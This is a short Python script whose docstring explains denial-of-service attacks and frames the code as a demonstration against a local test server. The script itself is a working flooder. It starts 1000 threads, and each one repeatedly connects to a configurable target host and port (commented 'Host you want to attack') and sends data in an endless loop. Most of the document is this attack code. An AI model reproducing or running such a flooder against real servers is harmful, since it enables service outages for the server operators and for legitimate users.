'''
A DOS attack or Denail of Service attack is used
to deny access to a server or host that provides some sort of service.
This is done by sending a large amount of packets to the server or host
overloading it and making it unable to send or recieve packets to/from the 
actual users. (A DDOS or Distrubuted Denail of Service, is the same as a DOS
instead muilitple hosts are doing DOS's, usually a botnet controlled by a 
threat actor).

In this demostration the client will time how long it takes
to send and recieve a message from the server. Notice how it only
take 0.00 something milliseconds to complete the transaction.
Run this script and you'll see the time go up into the seconds.
This is because the server is so busy trying to sort out the connections
between the fake clients, that the real client is having to wait longer
for their data.
'''

from threading import Thread
import socket

DESTINATION_HOST = '192.168.0.10' # Host you want to attack
DPORT = 1234 # Port open on host

def connect_loop():
    while True:
        s = socket.socket()
        try:
            s.connect((DESTINATION_HOST, DPORT)) # Connects to server
            print("Connected")
            while True:
                s.send(b"ACBDEFG") # Sends packet
                print("Sent message!")
        except:
            print("Failed to connect!")
        s.close() # Closes connection to server

# 1000 is the amount of loops you want to start
# For this purpose 1000 is fine to see the difference
# in time it takes to send messages
for _ in range(1000): 
    Thread(target=connect_loop).start()